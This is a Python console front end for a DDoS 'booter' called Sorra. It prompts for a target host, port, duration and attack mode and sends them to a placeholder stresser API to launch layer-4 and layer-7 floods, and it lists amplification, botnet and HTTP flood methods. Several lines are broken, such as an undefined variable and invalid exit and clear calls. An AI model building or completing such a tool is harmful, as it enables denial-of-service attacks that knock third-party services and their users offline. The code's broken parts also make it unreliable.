import requests
from colorama import init, Fore
from easygui import fileopenbox
from requests import Session, exceptions
import subprocess, requests, time, os
from os import system, name 
import configparser
import time
import os
from colorama import init, Fore, Back, Style
from console.utils import set_title

init(convert=True)
set_title("Loadet 946")

logo = Fore.MAGENTA + '''
  ██████  ▒█████   ██▀███   ██▀███   ▄▄▄      
▒██    ▒ ▒██▒  ██▒▓██ ▒ ██▒▓██ ▒ ██▒▒████▄    
░ ▓██▄   ▒██░  ██▒▓██ ░▄█ ▒▓██ ░▄█ ▒▒██  ▀█▄  
  ▒   ██▒▒██   ██░▒██▀▀█▄  ▒██▀▀█▄  ░██▄▄▄▄██ 
▒██████▒▒░ ████▓▒░░██▓ ▒██▒░██▓ ▒██▒ ▓█   ▓██▒
▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
░ ░▒  ░ ░  ░ ▒ ▒░   ░▒ ░ ▒░  ░▒ ░ ▒░  ▒   ▒▒ ░
░  ░  ░  ░ ░ ░ ▒    ░░   ░   ░░   ░   ░   ▒   
      ░      ░ ░     ░        ░           ░  
            TYPE "help" FOR HELP.
                                                                                                        
'''

commands = ["l4","l7", "help", "methods", "clear", "exit", "bots", "info", "stop"]

print(logo)

def take_commands():
    command = input(Fore.RED +"[Sorra ~] ")
    while command not in commands:
        command = input(Fore.RED +"[Sorra ~] ")
    if command == "l4":
        host = input(" host:")
        port = input(" Port:")
        time = input(" Time:")
        mode = input(" Mode:")
        api1 = "YOUR API" + host + "" + mode + "" + port +"" + time + ""
        r = requests.get(api1)
        print(Fore.CYAN +" Flood Brodcasted To Servers.")
    if command == "l7":
        host = input("[Sorra ~] host:")
        time = input("[Sorra ~] Time:")
        mode = input("[Sorra ~] Mode:")
        api2 = "YOUR API" +host + "" + time + "" + mode + ""
        r2 = requests.get(api6)
        print(Fore.CYAN +" Flood Brodcasted To Servers.")
    if command == "stop":
        print(Fore.CYAN +" Flood Successfully Stopped.")
    if command == "exit":
        pillstress.py.exit
    if command == "clear":
        cls.commands
    if command == "methods":
        print(Fore.CYAN +"-l4-Udp : LDAP, NTP, DNS, NUKEUDP, GRE, UDPBYPASS")
        
        print(Fore.CYAN +"-l4-Special : OVH-UDP, DISCORD, RUST, HURTWORLD, TCP-SPECIAL, OVH")
        
        print(Fore.CYAN +"-l4-Botnet : VSE, STOMP, ICMPECHO, SYN, PLAIN, DNSWATER")
        
        print(Fore.CYAN +"-l3 : GRENADE, GREETH")
        
        print(Fore.CYAN +"-l7 : WEB-SOCKET, HTTP-REQUEST, HTTP-BASIC, EMULATED-BROWSER, FIVEM, TOR")
    if command == "help":
        print(Fore.CYAN +"Commands : l4, l7, methods, info, clear, bots, stop, exit")
    if command == "info":
        print(Fore.CYAN +"[Sorra ~] Made by r00kie ~ Telegram: @rootrookie")
